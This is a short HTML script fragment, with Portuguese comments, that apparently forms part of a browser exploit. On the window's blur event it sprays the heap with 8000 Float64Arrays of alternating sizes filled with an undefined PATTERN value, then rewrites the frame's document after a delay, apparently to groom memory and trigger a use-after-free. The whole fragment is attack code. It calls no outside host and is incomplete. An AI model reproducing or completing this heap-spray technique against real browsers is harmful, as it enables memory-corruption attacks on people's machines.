<script>
    // ... dentro do onblur do Iframe ...
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            // Alternamos entre tamanho 10 e 16
            let size = (i % 2 === 0) ? 10 : 16;
            let p = new Float64Array(size);
            p.fill(PATTERN); 
            spray.push(p);
        }
        
        setTimeout(() => {
            document.open();
            document.write('<h1>FRAME FINALIZADO</h1>');
            document.close();
        }, 1000);
    };
</script>
